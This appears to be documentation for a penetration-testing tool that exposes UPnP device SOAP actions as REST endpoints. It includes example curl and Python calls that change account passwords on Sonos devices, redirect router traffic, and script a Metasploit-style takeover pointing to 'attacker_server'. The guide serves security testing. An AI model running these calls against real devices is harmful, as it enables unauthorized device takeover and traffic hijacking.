# UPnP to REST API Generator: Complete Guide

## Overview

The API Generator is the culmination of the enhanced UPnP analysis pipeline. It transforms comprehensive device profiles containing hundreds of UPnP SOAP actions into modern, testable REST APIs that integrate seamlessly with contemporary penetration testing tools.

## 🎯 **Purpose and Value**

### The Problem: UPnP-Security Tool Gap
- **UPnP uses SOAP/XML**: Complex, verbose protocol from the 1990s
- **Security tools expect HTTP/REST**: Burp Suite, OWASP ZAP, scripting frameworks
- **Manual SOAP is painful**: Hand-crafting XML envelopes for every test
- **No automation**: Difficult to script UPnP attack chains
- **Tool incompatibility**: Modern security frameworks don't understand UPnP

### The Solution: Protocol Bridge
The API Generator creates a **protocol bridge** that converts:
- ✅ **SOAP Actions** → **HTTP Endpoints**  
- ✅ **XML Envelopes** → **JSON Requests**
- ✅ **UPnP Complexity** → **REST Simplicity**
- ✅ **1990s Protocol** → **2025 Security Tools**

## 🔧 **How It Works**

### Input: Enhanced Profiles
The generator consumes enhanced profiles containing:
```json
{
  "name": "Sonos Port",
  "upnp": {
    "action_inventory": {
      "systemproperties": {
        "EditAccountPasswordX": {
          "complexity": "🔴 Complex",
          "category": "security",
          "arguments_in": [
            {"name": "AccountType", "data_type": "string"},
            {"name": "AccountID", "data_type": "string"}, 
            {"name": "NewAccountPassword", "data_type": "string"}
          ],
          "arguments_out": [],
          "description": "Edit user account password"
        }
      }
    },
    "services": {
      "systemproperties": {
        "serviceType": "urn:schemas-upnp-org:service:SystemProperties:1",
        "controlURL": "/SystemProperties/Control"
      }
    }
  }
}
```

### Output: Working FastAPI Application
The generator produces:
```python
@app.post("/systemproperties/edit_account_password_x")
async def edit_account_password_x(request: EditAccountPasswordXRequest):
    """
    Edit user account password
    
    Complexity: 🔴 Complex
    Category: security
    Service: systemproperties
    """
    # Validate connection
    _check_device_connection()
    
    # Build SOAP request
    control_url = f"http://{DEVICE_HOST}:{DEVICE_PORT}/SystemProperties/Control"
    arguments = request.dict()
    
    # Execute SOAP action
    result = await soap_client.call_action(
        control_url, 
        "urn:schemas-upnp-org:service:SystemProperties:1",
        "EditAccountPasswordX", 
        arguments
    )
    
    return {
        "status": "success",
        "action": "EditAccountPasswordX",
        "arguments": arguments,
        "result": result
    }
```

### Usage: Simple HTTP Request
Penetration testers can now use:
```bash
curl -X POST "http://localhost:8000/systemproperties/edit_account_password_x" \
  -H "Content-Type: application/json" \
  -d '{
    "AccountType": "admin",
    "AccountID": "root", 
    "NewAccountPassword": "backdoor123"
  }'
```

## 📊 **Generated API Features**

### 1. **Automatic Documentation**
- **Interactive Swagger UI** at `/docs`
- **ReDoc documentation** at `/redoc` 
- **OpenAPI 3.0 specification** for tool integration
- **Request/response examples** for every endpoint

### 2. **Request Validation**
- **Data type validation** based on SCPD specifications
- **Enum constraints** for allowed values
- **Range validation** for numeric parameters
- **Required parameter enforcement**

### 3. **Error Handling**
- **HTTP status codes** (400, 500, etc.)
- **Detailed error messages** with troubleshooting hints
- **SOAP fault translation** to HTTP errors
- **Connection validation** before action execution

### 4. **Security Features**
- **CORS support** for web-based tools
- **Connection management** (must initialize before use)
- **Action categorization** highlighting security-critical endpoints
- **Complexity indicators** for risk assessment

## 🚀 **Generated Files**

When you run the API generator, you get a complete deployment package:

### Core API Files
```
generated_apis/sonos_port/
├── sonos_port_api.py              # Main FastAPI application
├── requirements.txt               # Python dependencies
├── start_sonos_port_api.sh        # Startup script
└── sonos_port_api_docs.md         # Comprehensive documentation
```

### API Application Structure
```python
# FastAPI app with metadata
app = FastAPI(
    title="Sonos Port API",
    description="Auto-generated REST API for Sonos Port UPnP device control",
    version="1.0.0"
)

# CORS middleware for tool integration
app.add_middleware(CORSMiddleware, allow_origins=["*"])

# Connection management
@app.post("/init")
async def initialize_device(host: str, port: int = 1400)

# Status and introspection
@app.get("/status")
async def get_api_status()

@app.get("/actions")  
async def list_all_actions()

# Generated action endpoints (one per UPnP action)
@app.post("/service_name/action_name")
async def generated_action_endpoint(...)
```

### Startup Script
```bash
#!/bin/bash
echo "🚀 Starting Sonos Port API..."
pip install -r requirements.txt
uvicorn sonos_port_api:app --host 0.0.0.0 --port 8000 --reload
```

## 🎯 **Penetration Testing Integration**

### Burp Suite Integration
1. **Start the generated API** for target device
2. **Configure Burp proxy** to intercept localhost:8000
3. **Execute actions through API** - all requests go through Burp
4. **Modify payloads in real-time** using Burp's tools
5. **Automatically scan all endpoints** with Burp's scanner

### OWASP ZAP Integration  
1. **Import OpenAPI specification** from `/docs`
2. **Automatic endpoint discovery** - ZAP finds all actions
3. **Systematic fuzzing** of all parameters
4. **Vulnerability scanning** across the entire attack surface

### Python Scripting
```python
import requests

# Initialize connection to target
api = "http://localhost:8000"
requests.post(f"{api}/init?host=192.168.1.100&port=1400")

# Get all available actions
actions = requests.get(f"{api}/actions").json()

# Iterate through all security actions
for service, service_actions in actions["actions_by_service"].items():
    for action, info in service_actions.items():
        if info["category"] == "security":
            endpoint = info["endpoint"]
            print(f"Testing security action: {endpoint}")
            
            # Attempt action with default/test values
            response = requests.post(f"{api}{endpoint}")
            print(f"Result: {response.status_code}")
```

### Postman Collections
1. **Import OpenAPI spec** into Postman
2. **Auto-generate request collection** for all endpoints
3. **Create attack scenarios** with chained requests
4. **Share collections** with team members
5. **Environment variables** for target device IPs

## 🔍 **Real-World Examples**

### Example 1: Sonos Security Testing
```bash
# Generated API provides 196 REST endpoints for Sonos device
# Including critical security action:

curl -X POST "http://localhost:8000/systemproperties/edit_account_password_x" \
  -d '{"AccountType": "Spotify", "AccountID": "user123", "NewAccountPassword": "pwned"}'

# Result: Direct password manipulation via simple HTTP call
```

### Example 2: Samsung TV Control
```bash
# Generated API converts complex IRCC SOAP actions to REST:

curl -X POST "http://localhost:8000/ircc/x_send_ircc" \
  -d '{"IRCCCode": "AAAAAQAAAAEAAACgAw=="}'  # Power button

# Result: TV power control via HTTP request
```

### Example 3: Router Configuration
```bash
# Network device APIs enable configuration manipulation:

curl -X POST "http://localhost:8000/layer3forwarding/set_default_connection_service" \
  -d '{"NewDefaultConnectionService": "malicious_service"}'

# Result: Traffic redirection via REST API
```

## ⚙️ **Configuration Options**

### API Generation Parameters
```bash
# Basic generation
upnp-cli generate-api profile.json --output-dir apis/

# Custom API settings
upnp-cli generate-api profile.json \
  --output-dir apis/ \
  --api-port 8080 \
  --api-host 0.0.0.0 \
  --enable-cors \
  --add-auth
```

### Runtime Configuration
```python
# Device connection
POST /init?host=192.168.1.100&port=1400

# API settings
{
  "timeout": 30,
  "retry_attempts": 3,
  "validate_ssl": false
}
```

## 🔒 **Security Considerations**

### API Deployment Security
- **Never expose APIs to public networks** - localhost only
- **Use APIs only in controlled testing environments**
- **Implement authentication** for production deployments
- **Monitor API access logs** for unauthorized usage

### Target Device Impact
- **APIs provide full device control** - use responsibly
- **Some actions may cause service disruption** (volume, power)
- **Security actions can permanently alter devices** (passwords)
- **Always test on isolated networks first**

### Legal and Ethical Usage
- **Only target devices you own** or have explicit permission to test
- **Follow responsible disclosure** for discovered vulnerabilities  
- **Document all testing activities** for audit trails
- **Respect device availability** for legitimate users

## 🚀 **Advanced Features**

### Batch Operations
```python
# Execute multiple actions in sequence
api_client = UPnPAPIClient("http://localhost:8000")

await api_client.init(host="192.168.1.100", port=1400)
await api_client.volume.set_volume(50)
await api_client.transport.play()
await api_client.security.edit_account_password("admin", "root", "backdoor")
```

### Custom Payload Generation
```python
# Generate payloads based on action specifications
for action in profile["upnp"]["action_inventory"]["systemproperties"]:
    payloads = generate_test_payloads(action["arguments_in"])
    for payload in payloads:
        test_action_with_payload(action["name"], payload)
```

### Integration with Security Frameworks
```python
# Metasploit module integration
class UPnPExploit:
    def __init__(self, api_url):
        self.api = UPnPAPIClient(api_url)
    
    def exploit(self, target_host):
        self.api.init(target_host)
        
        # Use API for exploitation
        self.api.security.edit_account_password("admin", "root", "metasploit")
        self.api.config.set_network_redirect("attacker_server")
```

## 📈 **Performance Considerations**

### API Performance
- **Async operations** for concurrent action execution
- **Connection pooling** for multiple device control
- **Request caching** for frequently accessed data
- **Rate limiting** to prevent device overload

### Scaling for Multiple Devices
```python
# Multi-device API management
device_apis = {
    "sonos_1": UPnPAPIClient("http://localhost:8001"),
    "sonos_2": UPnPAPIClient("http://localhost:8002"),  
    "samsung_tv": UPnPAPIClient("http://localhost:8003")
}

# Coordinate attacks across multiple devices
async def coordinate_attack():
    for name, api in device_apis.items():
        await api.volume.set_volume(100)  # Simultaneous volume attack
```

## 🛠️ **Troubleshooting**

### Common Issues

#### "Could not import module" Error
```bash
# Ensure you're in the correct directory
cd generated_apis/device_name/
python device_api.py

# Or use absolute path
python /path/to/generated_apis/device_name/device_api.py
```

#### Device Connection Failures
```bash
# Test device connectivity first
curl -X POST "http://localhost:8000/init?host=192.168.1.100&port=1400"

# Check device is responding
upnp-cli --host 192.168.1.100 info
```

#### SOAP Action Failures  
```bash
# Check action parameters match SCPD specification
curl "http://localhost:8000/actions" | jq '.actions_by_service.service_name.action_name'

# Verify argument data types and constraints
curl "http://localhost:8000/docs" # Check interactive documentation
```

### Debug Mode
```python
# Enable detailed logging
import logging
logging.basicConfig(level=logging.DEBUG)

# Run API with debug info
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="debug")
```

## 📚 **Next Steps**

1. **Generate APIs** for all enhanced profiles in your collection
2. **Integrate with Burp Suite** for comprehensive testing
3. **Create automated test scripts** for common attack scenarios  
4. **Build custom security modules** using the API interfaces
5. **Share findings** with the security community (responsibly)

The API Generator transforms complex UPnP protocols into accessible, modern interfaces that unlock the full potential of IoT device security testing. By bridging the gap between legacy protocols and contemporary tools, it enables more thorough, efficient, and scalable penetration testing of the growing IoT attack surface. 